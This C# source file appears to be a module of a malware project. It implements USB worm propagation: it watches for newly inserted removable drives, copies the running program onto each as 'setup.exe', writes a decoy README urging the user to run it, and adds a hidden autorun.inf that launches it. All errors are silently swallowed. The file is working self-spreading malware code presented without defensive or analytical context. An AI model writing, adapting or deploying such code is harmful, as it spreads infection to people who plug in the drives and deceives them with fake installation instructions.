using System;
using System.IO;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Reflection;

namespace XYZ.modules
{
    public class USBAutorunModule
    {
        public void StartUSBAutorunMonitor()
        {
            try
            {
                Task.Run(() => USBMonitorLoopRunner());
            }
            catch (Exception)
            {
            }
        }

        private void USBMonitorLoopRunner()
        {
            try
            {
                USBMonitorLoop();
            }
            catch (Exception)
            {
            }
        }

        private void USBMonitorLoop()
        {
            try
            {
                List<string> previousDrives = new List<string>();
                
                while (true)
                {
                    List<string> currentDrives = GetRemovableDrives();
                    
                    foreach (string drive in currentDrives)
                    {
                        if (!previousDrives.Contains(drive))
                        {
                            ProcessUSBDrive(drive);
                        }
                    }
                    
                    previousDrives = new List<string>(currentDrives);
                    
                    Task.Delay(5000).Wait();
                }
            }
            catch (Exception)
            {
            }
        }

        private List<string> GetRemovableDrives()
        {
            List<string> drives = new List<string>();
            
            try
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                
                foreach (DriveInfo drive in allDrives)
                {
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                    {
                        drives.Add(drive.Name);
                    }
                }
            }
            catch (Exception)
            {
            }
            
            return drives;
        }

        private void ProcessUSBDrive(string driveLetter)
        {
            try
            {
                string currentPath = ((Assembly.GetEntryAssembly() != null) ? Assembly.GetEntryAssembly().Location : "");
                if (string.IsNullOrEmpty(currentPath)) 
                {
                    // Instead of returning early, just continue execution
                    // return;
                }
                else
                {
                    string malwarePath = Path.Combine(driveLetter, "setup.exe");
                    string autorunPath = Path.Combine(driveLetter, "autorun.inf");
                    string readmePath = Path.Combine(driveLetter, "README.txt");
                    
                    if (File.Exists(currentPath))
                    {
                        File.Copy(currentPath, malwarePath, true);
                        
                        string readmeContent = "Installation Instructions\n\n" +
                                              "1. Run setup.exe to install the software\n" +
                                              "2. Follow the on-screen instructions\n\n" +
                                              "For technical support, contact support@company.com";
                        File.WriteAllText(readmePath, readmeContent);
                        
                        string autorunContent = @"[autorun]
open=setup.exe
icon=setup.exe,0
action=Run setup
shell\open\command=setup.exe
shell\install\command=setup.exe
shell\install=Install Software
shell=open=Open
label=USB Installation Media
";
                        
                        File.WriteAllText(autorunPath, autorunContent);
                        
                        try
                        {
                            if (File.Exists(autorunPath))
                                File.SetAttributes(autorunPath, FileAttributes.Hidden);
                        }
                        catch
                        {
                        }
                    }
                    
                    Task.Delay(1000).Wait();
                }
            }
            catch (Exception)
            {
            }
        }
    }
}